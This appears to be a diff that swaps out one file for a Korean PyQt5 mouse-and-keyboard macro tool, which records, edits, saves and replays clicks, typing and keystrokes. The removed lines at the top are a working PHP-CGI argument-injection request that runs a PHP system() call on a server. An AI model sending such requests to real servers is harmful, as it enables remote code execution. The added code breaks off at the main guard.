@@ -1,9 +1,913 @@
-POST /cgi/ajax_logsearch.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
-Host: 172.16.150.171:8500
-Cookie: stat_period=w; stat_week=2025-06-29%232025-07-05; stat_month=07; stat_year=2025; PHPSESSID=3nins1pluid31b7krqn6fr7rm0
-Content-Length: 24
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
-Connection: keep-alive
+import os
+import sys
+from pathlib import Path
 
-<?php system('calc'); ?>
+# 환경 변수 설정
+venv_path = Path(sys.prefix)
+plugin_path = venv_path / "Lib" / "site-packages" / "PyQt5" / "Qt5" / "plugins"
+bin_path = venv_path / "Lib" / "site-packages" / "PyQt5" / "Qt5" / "bin"
+
+os.environ["QT_PLUGIN_PATH"] = str(plugin_path)
+os.environ["QT_QPA_PLATFORM"] = "windows"
+os.environ["PATH"] = str(bin_path) + os.pathsep + os.environ["PATH"]
+
+# 이후 모든 import 구문
+import time
+import re
+import json
+from datetime import datetime
+from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLineEdit, QLabel, QSpinBox,
+                             QComboBox, QShortcut, QRadioButton, QButtonGroup, QMessageBox, QListWidget,
+                             QAbstractItemView, QSplitter, QGroupBox, QTextEdit, QMenu, QAction, QFileDialog)
+from PyQt5.QtCore import Qt, QTimer, QThread, pyqtSignal
+from PyQt5.QtGui import QKeySequence, QColor, QFont
+import pyautogui
+
+# FailSafe 비활성화
+pyautogui.FAILSAFE = False
+
+
+class Action:
+    def __init__(self, action_type, x=0, y=0, text="", wait_time=0, key=""):
+        self.action_type = action_type
+        self.x = x
+        self.y = y
+        self.text = text
+        self.wait_time = wait_time
+        self.key = key
+
+    def __str__(self):
+        if self.action_type == "click":
+            return f"클릭: ({self.x}, {self.y})"
+        elif self.action_type == "type":
+            return f"입력: '{self.text}'"
+        elif self.action_type == "wait":
+            return f"대기: {self.wait_time}초"
+        elif self.action_type == "key":
+            return f"키 입력: {self.key}"
+
+    def to_dict(self):
+        return {
+            'action_type': self.action_type,
+            'x': self.x,
+            'y': self.y,
+            'text': self.text,
+            'wait_time': self.wait_time,
+            'key': self.key
+        }
+
+    @staticmethod
+    def from_dict(data):
+        return Action(
+            action_type=data['action_type'],
+            x=data.get('x', 0),
+            y=data.get('y', 0),
+            text=data.get('text', ''),
+            wait_time=data.get('wait_time', 0),
+            key=data.get('key', '')
+        )
+
+
+class ActionThread(QThread):
+    update_signal = pyqtSignal(int, int)
+    finished_signal = pyqtSignal()
+    error_signal = pyqtSignal(str)
+
+    def __init__(self, actions, repeat_count):
+        super().__init__()
+        self.actions = actions.copy()
+        self.repeat_count = repeat_count
+        self.is_running = True
+        self.is_paused = False
+
+    def run(self):
+        iteration = 0
+        while (self.repeat_count == -1 or iteration < self.repeat_count) and self.is_running:
+            for idx, action in enumerate(self.actions):
+                if not self.is_running:
+                    break
+
+                # 일시정지 처리
+                while self.is_paused and self.is_running:
+                    time.sleep(0.1)
+
+                if not self.is_running:
+                    break
+
+                try:
+                    if action.action_type == "click":
+                        pyautogui.click(action.x, action.y)
+                    elif action.action_type == "type":
+                        text = self._process_text_patterns(action.text, iteration)
+                        pyautogui.write(text)
+                    elif action.action_type == "wait":
+                        # 대기 중에도 중지 가능하도록
+                        for _ in range(int(action.wait_time * 10)):
+                            if not self.is_running:
+                                break
+                            time.sleep(0.1)
+                    elif action.action_type == "key":
+                        if '+' in action.key:
+                            keys = [k.strip() for k in action.key.split('+')]
+                            pyautogui.hotkey(*keys)
+                        else:
+                            pyautogui.press(action.key)
+
+                    self.update_signal.emit(iteration + 1, idx)
+                    time.sleep(0.1)
+                except Exception as e:
+                    self.error_signal.emit(f"동작 실행 오류: {str(e)}")
+                    self.is_running = False
+                    break
+            iteration += 1
+        self.finished_signal.emit()
+
+    def _process_text_patterns(self, text, iteration):
+        """텍스트 패턴 처리를 별도 메서드로 분리"""
+        # %num+오프셋% 패턴 처리
+        offset_pattern = re.compile(r'%num\+(\d+)%')
+        for match in offset_pattern.finditer(text):
+            offset = int(match.group(1))
+            text = text.replace(match.group(0), str(iteration + 1 + offset))
+
+        # %num:시작값% 패턴 처리
+        start_pattern = re.compile(r'%num:(\d+)%')
+        for match in start_pattern.finditer(text):
+            start_num = int(match.group(1))
+            text = text.replace(match.group(0), str(start_num + iteration))
+
+        # 기본 %num% 패턴 처리
+        text = text.replace("%num%", str(iteration + 1))
+
+        # %% 패턴을 %로 대체
+        text = text.replace("%%", "%")
+
+        return text
+
+    def stop(self):
+        self.is_running = False
+
+    def pause(self):
+        self.is_paused = True
+
+    def resume(self):
+        self.is_paused = False
+
+
+class DraggableListWidget(QListWidget):
+    itemMoved = pyqtSignal(int, int)
+
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setDragDropMode(QAbstractItemView.InternalMove)
+        self.setSelectionMode(QAbstractItemView.ExtendedSelection)
+        self.itemDoubleClicked.connect(parent.edit_action)
+        self.setContextMenuPolicy(Qt.CustomContextMenu)
+        self.customContextMenuRequested.connect(parent.show_context_menu)
+
+    def dropEvent(self, event):
+        from_index = self.currentRow()
+        super().dropEvent(event)
+        to_index = self.currentRow()
+        if from_index != to_index:
+            self.itemMoved.emit(from_index, to_index)
+
+
+class MouseControlApp(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.actions = []
+        self.action_thread = None
+        self.editing_index = None
+        self.last_save_path = None
+        self.initUI()
+
+    def initUI(self):
+        self.setWindowTitle('고급 마우스 및 키보드 제어 프로그램')
+        self.setGeometry(300, 300, 1000, 750)
+
+        # 스플리터를 사용하여 메인 영역과 도움말 영역을 분리
+        main_splitter = QSplitter(Qt.Horizontal)
+
+        # 왼쪽 메인 영역
+        main_widget = QWidget()
+        main_layout = QVBoxLayout(main_widget)
+        main_layout.setContentsMargins(10, 10, 10, 10)
+
+        # 실시간 마우스 좌표 표시
+        self.mouse_pos_label = QLabel('마우스 좌표: (0, 0)')
+        self.mouse_pos_label.setStyleSheet("font-weight: bold; font-size: 12pt;")
+        main_layout.addWidget(self.mouse_pos_label)
+
+        # 마우스 좌표 갱신 타이머
+        self.timer = QTimer(self)
+        self.timer.timeout.connect(self.update_mouse_position)
+        self.timer.start(100)
+
+        # 동작 선택
+        action_layout = QHBoxLayout()
+        self.action_combo = QComboBox()
+        self.action_combo.addItems(["마우스 클릭", "텍스트 입력", "대기", "키 입력"])
+        self.action_combo.currentTextChanged.connect(self.on_action_changed)
+        action_layout.addWidget(QLabel('동작:'))
+        action_layout.addWidget(self.action_combo)
+        main_layout.addLayout(action_layout)
+
+        # 마우스 좌표 입력
+        coord_layout = QHBoxLayout()
+        self.x_input = QSpinBox()
+        self.x_input.setRange(-9999, 9999)
+        self.y_input = QSpinBox()
+        self.y_input.setRange(-9999, 9999)
+        self.capture_button = QPushButton('좌표 캡처 (F2)')
+        self.capture_button.clicked.connect(self.capture_mouse_position)
+        coord_layout.addWidget(QLabel('X:'))
+        coord_layout.addWidget(self.x_input)
+        coord_layout.addWidget(QLabel('Y:'))
+        coord_layout.addWidget(self.y_input)
+        coord_layout.addWidget(self.capture_button)
+        main_layout.addLayout(coord_layout)
+
+        # 텍스트 입력
+        self.text_input = QLineEdit()
+        self.text_input.setPlaceholderText("특수 패턴: %num%, %num+3%, %num:10%")
+        main_layout.addWidget(QLabel('텍스트 입력:'))
+        main_layout.addWidget(self.text_input)
+
+        # 대기 시간 설정
+        wait_layout = QHBoxLayout()
+        self.wait_time = QSpinBox()
+        self.wait_time.setRange(0, 3600)
+        self.wait_time.setValue(1)
+        wait_layout.addWidget(QLabel('대기 시간 (초):'))
+        wait_layout.addWidget(self.wait_time)
+        main_layout.addLayout(wait_layout)
+
+        # 키 입력
+        self.key_input = QLineEdit()
+        self.key_input.setPlaceholderText("예: shift+f4, ctrl+c, alt+tab")
+        key_input_layout = QVBoxLayout()
+        key_input_layout.addWidget(QLabel('키 입력 (키 조합은 +로 구분):'))
+        key_input_layout.addWidget(self.key_input)
+        key_input_info = QLabel("? 키 입력 도움말")
+        key_input_info.setStyleSheet("color: blue; text-decoration: underline; cursor: pointer;")
+        key_input_info.mousePressEvent = self.show_key_input_help
+        key_input_layout.addWidget(key_input_info)
+        main_layout.addLayout(key_input_layout)
+
+        # 동작 추가/수정 버튼
+        self.add_button = QPushButton('동작 추가 (F2)')
+        self.add_button.clicked.connect(self.add_action)
+        self.add_button.setStyleSheet("QPushButton { background-color: #4CAF50; color: white; font-weight: bold; }")
+
+        self.cancel_edit_button = QPushButton('수정 취소')
+        self.cancel_edit_button.clicked.connect(self.cancel_edit)
+        self.cancel_edit_button.setVisible(False)
+        self.cancel_edit_button.setStyleSheet("QPushButton { background-color: #f44336; color: white; }")
+
+        button_layout = QHBoxLayout()
+        button_layout.addWidget(self.add_button)
+        button_layout.addWidget(self.cancel_edit_button)
+        main_layout.addLayout(button_layout)
+
+        # 동작 목록
+        main_layout.addWidget(QLabel('동작 목록:'))
+        self.action_list = DraggableListWidget(self)
+        self.action_list.itemMoved.connect(self.on_item_moved)
+        main_layout.addWidget(self.action_list)
+
+        # 동작 관리 버튼들
+        action_buttons_layout = QHBoxLayout()
+        self.delete_button = QPushButton('선택 삭제 (Del)')
+        self.delete_button.clicked.connect(self.delete_action)
+        self.clear_button = QPushButton('전체 삭제')
+        self.clear_button.clicked.connect(self.clear_all_actions)
+        self.duplicate_button = QPushButton('복제')
+        self.duplicate_button.clicked.connect(self.duplicate_action)
+        self.move_up_button = QPushButton('위로 ↑')
+        self.move_up_button.clicked.connect(self.move_action_up)
+        self.move_down_button = QPushButton('아래로 ↓')
+        self.move_down_button.clicked.connect(self.move_action_down)
+
+        action_buttons_layout.addWidget(self.delete_button)
+        action_buttons_layout.addWidget(self.clear_button)
+        action_buttons_layout.addWidget(self.duplicate_button)
+        action_buttons_layout.addWidget(self.move_up_button)
+        action_buttons_layout.addWidget(self.move_down_button)
+        main_layout.addLayout(action_buttons_layout)
+
+        # 파일 관리 버튼
+        file_buttons_layout = QHBoxLayout()
+        self.save_button = QPushButton('저장')
+        self.save_button.clicked.connect(self.save_actions)
+        self.load_button = QPushButton('불러오기')
+        self.load_button.clicked.connect(self.load_actions)
+        file_buttons_layout.addWidget(self.save_button)
+        file_buttons_layout.addWidget(self.load_button)
+        main_layout.addLayout(file_buttons_layout)
+
+        # 반복 설정
+        repeat_group = QGroupBox("반복 설정")
+        repeat_layout = QVBoxLayout()
+
+        self.repeat_group = QButtonGroup(self)
+        self.no_repeat_radio = QRadioButton('반복 안 함')
+        self.finite_repeat_radio = QRadioButton('지정된 횟수만큼 반복')
+        self.infinite_repeat_radio = QRadioButton('무한 반복')
+
+        self.repeat_group.addButton(self.no_repeat_radio)
+        self.repeat_group.addButton(self.finite_repeat_radio)
+        self.repeat_group.addButton(self.infinite_repeat_radio)
+
+        repeat_layout.addWidget(self.no_repeat_radio)
+        repeat_layout.addWidget(self.finite_repeat_radio)
+        repeat_layout.addWidget(self.infinite_repeat_radio)
+
+        repeat_count_layout = QHBoxLayout()
+        self.repeat_count = QSpinBox()
+        self.repeat_count.setRange(1, 9999)
+        self.repeat_count.setValue(5)
+        repeat_count_layout.addWidget(QLabel('반복 횟수:'))
+        repeat_count_layout.addWidget(self.repeat_count)
+        repeat_layout.addLayout(repeat_count_layout)
+
+        repeat_group.setLayout(repeat_layout)
+        main_layout.addWidget(repeat_group)
+
+        # 실행 및 중지 버튼
+        run_stop_layout = QHBoxLayout()
+        self.run_button = QPushButton('실행 (F5)')
+        self.run_button.clicked.connect(self.run_actions)
+        # 실행 버튼 초기 스타일 (파란색)
+        self.run_button.setStyleSheet(
+            "QPushButton { background-color: #2196F3; color: white; font-weight: bold; font-size: 14pt; }")
+
+        self.pause_button = QPushButton('일시정지')
+        self.pause_button.clicked.connect(self.pause_resume_actions)
+        self.pause_button.setEnabled(False)
+
+        self.stop_button = QPushButton('중지 (Ctrl+Shift+Q)')
+        self.stop_button.clicked.connect(self.stop_actions)
+        self.stop_button.setEnabled(False)
+        self.stop_button.setStyleSheet(
+            "QPushButton:enabled { background-color: #f44336; color: white; font-weight: bold; }")
+
+        run_stop_layout.addWidget(self.run_button)
+        run_stop_layout.addWidget(self.pause_button)
+        run_stop_layout.addWidget(self.stop_button)
+        main_layout.addLayout(run_stop_layout)
+
+        # 진행 상황 표시
+        self.progress_label = QLabel('대기 중')
+        self.progress_label.setStyleSheet(
+            "font-size: 12pt; padding: 5px; background-color: #f0f0f0; border-radius: 5px;")
+        main_layout.addWidget(self.progress_label)
+
+        # 오른쪽 도움말 영역
+        help_widget = self._create_help_widget()
+
+        # 스플리터에 위젯 추가
+        main_splitter.addWidget(main_widget)
+        main_splitter.addWidget(help_widget)
+
+        # 전체 레이아웃 설정
+        layout = QHBoxLayout(self)
+        layout.addWidget(main_splitter)
+        main_splitter.setSizes([600, 400])
+
+        # 단축키 설정
+        self.shortcut_f2 = QShortcut(QKeySequence("F2"), self)
+        self.shortcut_f2.activated.connect(self.capture_mouse_position)
+
+        self.shortcut_f5 = QShortcut(QKeySequence("F5"), self)
+        self.shortcut_f5.activated.connect(self.run_actions)
+
+        self.shortcut_delete = QShortcut(QKeySequence("Delete"), self)
+        self.shortcut_delete.activated.connect(self.delete_action)
+
+        # 긴급 중지 단축키
+        self.emergency_shortcut = QShortcut(QKeySequence("Ctrl+Shift+Q"), self)
+        self.emergency_shortcut.activated.connect(self.emergency_stop)
+
+        # Ctrl+S 저장 단축키
+        self.save_shortcut = QShortcut(QKeySequence("Ctrl+S"), self)
+        self.save_shortcut.activated.connect(self.save_actions)
+
+        # 초기 상태 설정
+        self.on_action_changed(self.action_combo.currentText())
+        self.finite_repeat_radio.setChecked(True)
+
+    def _create_help_widget(self):
+        """도움말 위젯 생성을 별도 메서드로 분리"""
+        help_widget = QWidget()
+        help_layout = QVBoxLayout(help_widget)
+        help_layout.setContentsMargins(10, 10, 10, 10)
+
+        # 제목 추가
+        help_title = QLabel("프로그램 설명서")
+        help_title.setFont(QFont("Arial", 14, QFont.Bold))
+        help_title.setAlignment(Qt.AlignCenter)
+        help_layout.addWidget(help_title)
+
+        # 단축키 그룹
+        shortcuts_group = QGroupBox("단축키")
+        shortcuts_layout = QVBoxLayout()
+
+        shortcuts_info = QTextEdit()
+        shortcuts_info.setReadOnly(True)
+        shortcuts_info.setHtml("""
+        <style>
+            table {width: 100%; border-collapse: collapse;}
+            th, td {padding: 5px; border: 1px solid #ddd;}
+            th {background-color: #f2f2f2;}
+        </style>
+        <table>
+            <tr>
+                <th>단축키</th>
+                <th>기능</th>
+            </tr>
+            <tr>
+                <td><b>F2</b></td>
+                <td>현재 마우스 위치 캡처</td>
+            </tr>
+            <tr>
+                <td><b>F5</b></td>
+                <td>매크로 실행</td>
+            </tr>
+            <tr>
+                <td><b>Ctrl+Shift+Q</b></td>
+                <td>긴급 중지</td>
+            </tr>
+            <tr>
+                <td><b>Delete</b></td>
+                <td>선택한 동작 삭제</td>
+            </tr>
+            <tr>
+                <td><b>Ctrl+S</b></td>
+                <td>동작 목록 저장</td>
+            </tr>
+        </table>
+        """)
+        shortcuts_layout.addWidget(shortcuts_info)
+        shortcuts_group.setLayout(shortcuts_layout)
+        help_layout.addWidget(shortcuts_group)
+
+        # 특수 패턴 그룹
+        patterns_group = QGroupBox("특수 패턴")
+        patterns_layout = QVBoxLayout()
+
+        patterns_info = QTextEdit()
+        patterns_info.setReadOnly(True)
+        patterns_info.setHtml("""
+        <style>
+            table {width: 100%; border-collapse: collapse;}
+            th, td {padding: 5px; border: 1px solid #ddd;}
+            th {background-color: #f2f2f2;}
+        </style>
+        <p>텍스트 입력 시 다음 특수 패턴을 사용할 수 있습니다:</p>
+        <table>
+            <tr>
+                <th>패턴</th>
+                <th>설명</th>
+                <th>예시</th>
+            </tr>
+            <tr>
+                <td><b>%num%</b></td>
+                <td>반복 횟수</td>
+                <td>"test%num%" → "test1", "test2", ...</td>
+            </tr>
+            <tr>
+                <td><b>%num+숫자%</b></td>
+                <td>반복 횟수 + 오프셋</td>
+                <td>"test%num+3%" → "test4", "test5", ...</td>
+            </tr>
+            <tr>
+                <td><b>%num:숫자%</b></td>
+                <td>지정된 시작 번호부터</td>
+                <td>"test%num:4%" → "test4", "test5", ...</td>
+            </tr>
+            <tr>
+                <td><b>%%</b></td>
+                <td>퍼센트 기호 입력</td>
+                <td>"50%%" → "50%"</td>
+            </tr>
+        </table>
+        <p><b>활용 예시:</b></p>
+        <p>- 정책 이름 자동 증가: "정책%num%"</p>
+        <p>- 4번부터 시작: "정책%num:4%" 또는 "정책%num+3%"</p>
+        <p>- 파일명 생성: "report_%num%.xlsx"</p>
+        """)
+        patterns_layout.addWidget(patterns_info)
+        patterns_group.setLayout(patterns_layout)
+        help_layout.addWidget(patterns_group)
+
+        # 사용 팁 그룹
+        tips_group = QGroupBox("사용 팁")
+        tips_layout = QVBoxLayout()
+
+        tips_info = QTextEdit()
+        tips_info.setReadOnly(True)
+        tips_info.setHtml("""
+        <ul>
+            <li><b>작업 중간에 중단되었을 경우:</b> 특수 패턴 %num:숫자%를 사용하여 중단된 지점부터 다시 시작할 수 있습니다.</li>
+            <li><b>동작 순서 변경:</b> 드래그 앤 드롭 또는 위/아래 버튼으로 순서를 변경할 수 있습니다.</li>
+            <li><b>동작 수정:</b> 목록에서 항목을 더블 클릭하여 수정할 수 있습니다.</li>
+            <li><b>다중 선택:</b> Ctrl/Shift를 누르고 클릭하여 여러 항목을 선택할 수 있습니다.</li>
+            <li><b>동작 복제:</b> 선택한 동작을 복제하여 빠르게 유사한 동작을 추가할 수 있습니다.</li>
+            <li><b>작업 저장:</b> Ctrl+S로 현재 동작 목록을 저장하고 나중에 불러올 수 있습니다.</li>
+            <li><b>일시정지:</b> 실행 중 일시정지 버튼으로 작업을 잠시 중단할 수 있습니다.</li>
+            <li><b>자동화 속도 조절:</b> 대기 시간을 추가하여 각 동작 사이의 간격을 조절하세요.</li>
+            <li><b>긴급 상황:</b> Ctrl+Shift+Q를 눌러 언제든지 모든 동작을 중지할 수 있습니다.</li>
+        </ul>
+        """)
+        tips_layout.addWidget(tips_info)
+        tips_group.setLayout(tips_layout)
+        help_layout.addWidget(tips_group)
+
+        return help_widget
+
+    def show_key_input_help(self, event):
+        help_text = """
+        키 입력 가이드:
+        - 단일 키: 'f4', 'a', '1', 'enter', 'space' 등
+        - 키 조합: 'shift+f4', 'ctrl+c', 'alt+tab' 등
+
+        주요 특수 키:
+        shift, ctrl, alt, win, enter, space, tab,
+        backspace, delete, esc, insert, home, end, pageup, pagedown
+        up, down, left, right (화살표 키),
+        f1, f2, ..., f12 (펑션 키)
+
+        예시:
+        - 'shift+f4'
+        - 'ctrl+alt+delete'
+        - 'win+r'
+        - 'ctrl+shift+esc'
+        """
+        QMessageBox.information(self, "키 입력 도움말", help_text)
+
+    def update_mouse_position(self):
+        try:
+            x, y = pyautogui.position()
+            self.mouse_pos_label.setText(f'마우스 좌표: ({x}, {y})')
+        except Exception as e:
+            print(f"Error updating mouse position: {e}")
+
+    def capture_mouse_position(self):
+        try:
+            x, y = pyautogui.position()
+            self.x_input.setValue(x)
+            self.y_input.setValue(y)
+            if self.action_combo.currentText() == "마우스 클릭":
+                if self.editing_index is not None:
+                    self.update_action()
+                else:
+                    self.add_action()
+        except Exception as e:
+            print(f"Error capturing mouse position: {e}")
+
+    def on_action_changed(self, action):
+        self.x_input.setEnabled(action == "마우스 클릭")
+        self.y_input.setEnabled(action == "마우스 클릭")
+        self.capture_button.setEnabled(action == "마우스 클릭")
+        self.text_input.setEnabled(action == "텍스트 입력")
+        self.wait_time.setEnabled(action == "대기")
+        self.key_input.setEnabled(action == "키 입력")
+
+        # 입력 필드 초기화
+        if self.editing_index is None:
+            self.text_input.clear()
+            self.key_input.clear()
+
+    def add_action(self):
+        action_type = self.action_combo.currentText()
+
+        # 입력 검증
+        if action_type == "마우스 클릭":
+            action = Action("click", self.x_input.value(), self.y_input.value())
+        elif action_type == "텍스트 입력":
+            if not self.text_input.text():
+                QMessageBox.warning(self, "경고", "텍스트를 입력하세요.")
+                return
+            action = Action("type", text=self.text_input.text())
+        elif action_type == "대기":
+            if self.wait_time.value() == 0:
+                QMessageBox.warning(self, "경고", "대기 시간을 설정하세요.")
+                return
+            action = Action("wait", wait_time=self.wait_time.value())
+        elif action_type == "키 입력":
+            if not self.key_input.text():
+                QMessageBox.warning(self, "경고", "키를 입력하세요.")
+                return
+            action = Action("key", key=self.key_input.text().strip())
+
+        # 수정 모드인 경우 업데이트
+        if self.editing_index is not None:
+            self.actions[self.editing_index] = action
+            self.action_list.item(self.editing_index).setText(str(action))
+            self.exit_edit_mode()
+        else:
+            # 새로운 동작 추가
+            self.actions.append(action)
+            self.action_list.addItem(str(action))
+
+        # 입력 필드 초기화
+        self.text_input.clear()
+        self.key_input.clear()
+
+    def edit_action(self, item):
+        index = self.action_list.row(item)
+        action = self.actions[index]
+
+        # 수정할 동작의 타입에 맞게 콤보박스 설정
+        if action.action_type == "click":
+            self.action_combo.setCurrentText("마우스 클릭")
+            self.x_input.setValue(action.x)
+            self.y_input.setValue(action.y)
+        elif action.action_type == "type":
+            self.action_combo.setCurrentText("텍스트 입력")
+            self.text_input.setText(action.text)
+        elif action.action_type == "wait":
+            self.action_combo.setCurrentText("대기")
+            self.wait_time.setValue(action.wait_time)
+        elif action.action_type == "key":
+            self.action_combo.setCurrentText("키 입력")
+            self.key_input.setText(action.key)
+
+        # 수정 모드 설정
+        self.editing_index = index
+        self.add_button.setText("수정 완료 (F2)")
+        self.add_button.setStyleSheet("QPushButton { background-color: #FF9800; color: white; font-weight: bold; }")
+        self.cancel_edit_button.setVisible(True)
+
+        # 선택된 항목 하이라이트
+        self.action_list.item(index).setBackground(QColor(255, 200, 100))
+
+    def update_action(self):
+        """수정 완료 처리 - add_action()에서 처리하도록 변경"""
+        self.add_action()
+
+    def cancel_edit(self):
+        """수정 취소"""
+        self.exit_edit_mode()
+
+    def exit_edit_mode(self):
+        """수정 모드 종료"""
+        if self.editing_index is not None:
+            # 하이라이트 제거
+            if self.editing_index < self.action_list.count():
+                self.action_list.item(self.editing_index).setBackground(QColor(255, 255, 255))
+
+        self.editing_index = None
+        self.add_button.setText("동작 추가 (F2)")
+        self.add_button.setStyleSheet("QPushButton { background-color: #4CAF50; color: white; font-weight: bold; }")
+        self.cancel_edit_button.setVisible(False)
+
+        # 입력 필드 초기화
+        self.text_input.clear()
+        self.key_input.clear()
+
+    def delete_action(self):
+        selected_items = self.action_list.selectedItems()
+        if not selected_items:
+            return
+
+        # 수정 모드 종료
+        if self.editing_index is not None:
+            self.exit_edit_mode()
+
+        # 선택된 항목들의 인덱스를 역순으로 정렬 (뒤에서부터 삭제)
+        indices = sorted([self.action_list.row(item) for item in selected_items], reverse=True)
+
+        for index in indices:
+            del self.actions[index]
+            self.action_list.takeItem(index)
+
+    def clear_all_actions(self):
+        """전체 동작 삭제"""
+        reply = QMessageBox.question(self, '확인', '모든 동작을 삭제하시겠습니까?',
+                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+        if reply == QMessageBox.Yes:
+            self.actions.clear()
+            self.action_list.clear()
+            if self.editing_index is not None:
+                self.exit_edit_mode()
+
+    def duplicate_action(self):
+        """선택한 동작 복제"""
+        current_row = self.action_list.currentRow()
+        if current_row != -1:
+            action = self.actions[current_row]
+            new_action = Action(
+                action.action_type,
+                action.x,
+                action.y,
+                action.text,
+                action.wait_time,
+                action.key
+            )
+            self.actions.insert(current_row + 1, new_action)
+            self.action_list.insertItem(current_row + 1, str(new_action))
+
+    def move_action_up(self):
+        current_row = self.action_list.currentRow()
+        if current_row > 0:
+            self.on_item_moved(current_row, current_row - 1)
+            item = self.action_list.takeItem(current_row)
+            self.action_list.insertItem(current_row - 1, item)
+            self.action_list.setCurrentRow(current_row - 1)
+
+    def move_action_down(self):
+        current_row = self.action_list.currentRow()
+        if current_row < self.action_list.count() - 1:
+            self.on_item_moved(current_row, current_row + 1)
+            item = self.action_list.takeItem(current_row)
+            self.action_list.insertItem(current_row + 1, item)
+            self.action_list.setCurrentRow(current_row + 1)
+
+    def on_item_moved(self, from_index, to_index):
+        if from_index != to_index:
+            action = self.actions.pop(from_index)
+            self.actions.insert(to_index, action)
+
+    def show_context_menu(self, position):
+        """우클릭 컨텍스트 메뉴"""
+        if not self.action_list.itemAt(position):
+            return
+
+        menu = QMenu()
+        edit_action = QAction("수정", self)
+        edit_action.triggered.connect(lambda: self.edit_action(self.action_list.currentItem()))
+
+        duplicate_action = QAction("복제", self)
+        duplicate_action.triggered.connect(self.duplicate_action)
+
+        delete_action = QAction("삭제", self)
+        delete_action.triggered.connect(self.delete_action)
+
+        menu.addAction(edit_action)
+        menu.addAction(duplicate_action)
+        menu.addSeparator()
+        menu.addAction(delete_action)
+
+        menu.exec_(self.action_list.mapToGlobal(position))
+
+    def save_actions(self):
+        """동작 목록 저장"""
+        if not self.actions:
+            QMessageBox.warning(self, "경고", "저장할 동작이 없습니다.")
+            return
+
+        file_path, _ = QFileDialog.getSaveFileName(
+            self,
+            "동작 목록 저장",
+            self.last_save_path or "macro.json",
+            "JSON Files (*.json);;All Files (*)"
+        )
+
+        if file_path:
+            try:
+                data = {
+                    'actions': [action.to_dict() for action in self.actions],
+                    'saved_at': datetime.now().isoformat()
+                }
+                with open(file_path, 'w', encoding='utf-8') as f:
+                    json.dump(data, f, ensure_ascii=False, indent=2)
+                self.last_save_path = file_path
+                QMessageBox.information(self, "저장 완료", f"동작 목록이 저장되었습니다.\n{file_path}")
+            except Exception as e:
+                QMessageBox.critical(self, "저장 실패", f"파일 저장 중 오류가 발생했습니다.\n{str(e)}")
+
+    def load_actions(self):
+        """동작 목록 불러오기"""
+        file_path, _ = QFileDialog.getOpenFileName(
+            self,
+            "동작 목록 불러오기",
+            self.last_save_path or "",
+            "JSON Files (*.json);;All Files (*)"
+        )
+
+        if file_path:
+            try:
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    data = json.load(f)
+
+                # 기존 목록 초기화
+                self.actions.clear()
+                self.action_list.clear()
+
+                # 동작 목록 로드
+                for action_data in data['actions']:
+                    action = Action.from_dict(action_data)
+                    self.actions.append(action)
+                    self.action_list.addItem(str(action))
+
+                self.last_save_path = file_path
+                QMessageBox.information(self, "불러오기 완료",
+                                        f"동작 목록을 불러왔습니다.\n총 {len(self.actions)}개의 동작")
+            except Exception as e:
+                QMessageBox.critical(self, "불러오기 실패", f"파일을 불러오는 중 오류가 발생했습니다.\n{str(e)}")
+
+    def run_actions(self):
+        if not self.actions:
+            QMessageBox.warning(self, "경고", "실행할 동작이 없습니다.")
+            return
+
+        # 수정 모드인 경우 종료
+        if self.editing_index is not None:
+            self.exit_edit_mode()
+
+        # 반복 횟수 설정
+        if self.infinite_repeat_radio.isChecked():
+            repeat_count = -1
+        elif self.finite_repeat_radio.isChecked():
+            repeat_count = self.repeat_count.value()
+        else:
+            repeat_count = 1
+
+        # 스레드 생성 및 시작
+        self.action_thread = ActionThread(self.actions, repeat_count)
+        self.action_thread.update_signal.connect(self.update_progress)
+        self.action_thread.finished_signal.connect(self.on_action_finished)
+        self.action_thread.error_signal.connect(self.on_action_error)
+        self.action_thread.start()
+
+        # 버튼 상태 변경 (실행 중일 때)
+        self.run_button.setEnabled(False)
+        self.run_button.setText('실행 중...')
+        self.run_button.setStyleSheet(
+            "QPushButton { background-color: #9E9E9E; color: #666666; font-weight: bold; font-size: 14pt; }")
+
+        self.pause_button.setEnabled(True)
+        self.stop_button.setEnabled(True)
+        self.pause_button.setText("일시정지")
+
+    def pause_resume_actions(self):
+        if self.action_thread:
+            if self.action_thread.is_paused:
+                self.action_thread.resume()
+                self.pause_button.setText("일시정지")
+            else:
+                self.action_thread.pause()
+                self.pause_button.setText("재개")
+
+    def stop_actions(self):
+        if self.action_thread:
+            self.action_thread.stop()
+
+    def emergency_stop(self):
+        self.stop_actions()
+        QMessageBox.information(self, "긴급 중지", "프로그램이 긴급 중지되었습니다.")
+
+    def update_progress(self, iteration, action_index):
+        total_iterations = "∞" if self.infinite_repeat_radio.isChecked() else str(self.repeat_count.value())
+        self.progress_label.setText(f"반복 {iteration}/{total_iterations}, 동작 {action_index + 1}/{len(self.actions)}")
+
+        # 현재 실행 중인 동작 하이라이트
+        for i in range(self.action_list.count()):
+            item = self.action_list.item(i)
+            if i == action_index:
+                item.setBackground(QColor(144, 238, 144))  # 연한 녹색
+            else:
+                item.setBackground(QColor(255, 255, 255))
+
+    def on_action_finished(self):
+        # 버튼 상태 복원 (실행 완료 후)
+        self.run_button.setEnabled(True)
+        self.run_button.setText('실행 (F5)')
+        self.run_button.setStyleSheet(
+            "QPushButton { background-color: #2196F3; color: white; font-weight: bold; font-size: 14pt; }")
+
+        self.pause_button.setEnabled(False)
+        self.stop_button.setEnabled(False)
+        self.progress_label.setText("완료")
+
+        # 모든 동작의 배경색을 원래대로 되돌림
+        for i in range(self.action_list.count()):
+            item = self.action_list.item(i)
+            item.setBackground(QColor(255, 255, 255))
+
+        QMessageBox.information(self, "실행 완료", "모든 동작이 완료되었습니다.")
+
+    def on_action_error(self, error_msg):
+        QMessageBox.critical(self, "실행 오류", error_msg)
+        self.stop_actions()
+
+    def keyPressEvent(self, event):
+        # Delete 키는 단축키로 처리하므로 여기서는 처리하지 않음
+        super().keyPressEvent(event)
+
+    def closeEvent(self, event):
+        # 스레드가 실행 중이면 중지
+        if self.action_thread and self.action_thread.isRunning():
+            self.action_thread.stop()
+            self.action_thread.wait()
+        super().closeEvent(event)
+
+
+if __name__ == '__main__':
